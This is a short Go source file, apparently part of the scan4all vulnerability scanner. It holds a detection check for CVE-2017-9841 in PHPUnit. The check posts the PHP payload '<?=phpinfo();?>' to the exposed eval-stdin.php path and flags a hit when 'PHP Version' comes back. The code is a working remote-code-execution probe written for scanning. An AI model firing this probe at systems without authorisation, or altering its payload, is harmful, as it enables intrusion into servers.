package phpunit

import (
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
)

func CVE_2017_9841(url string) bool {
	if req, err := util.HttpRequset(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "POST", "<?=phpinfo();?>", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "PHP Version") {
			util.GoPocLog(fmt.Sprintf("Found vuln phpunit CVE_2017_9841\n"))
			return true
		}
	}
	return false
}
